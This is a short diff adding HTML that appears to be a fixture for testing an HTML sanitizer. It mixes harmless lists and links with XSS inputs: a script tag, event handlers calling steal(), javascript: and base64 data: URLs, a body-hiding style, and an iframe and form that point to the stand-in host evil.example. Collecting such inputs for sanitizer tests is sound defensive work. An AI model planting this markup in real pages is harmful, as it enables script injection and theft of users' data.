@@ -1,0 +1,11 @@
+<h2 onclick="steal()">Heading</h2>
+<script>alert("xss")</script>
+<style>body { display: none }</style>
+<iframe src="https://evil.example/frame"></iframe>
+<form action="https://evil.example"><label>Email <input name="email"></label><button>Send</button></form>
+<p>Hello <a href="javascript:alert(1)">bad link</a> and <a href="https://example.com" onmouseover="steal()">good link</a>.</p>
+<p><img src="javascript:alert(1)" onerror="steal()" alt="broken"> <img src="https://example.com/photo.png" alt="A photo"></p>
+<ul><li>One</li><li>Two</li></ul>
+<pre><code class="language-ts" data-evil="yes">const n: number = 1 &lt; 2;</code></pre>
+<a href="//protocol-relative.example/path">protocol relative</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data link</a>
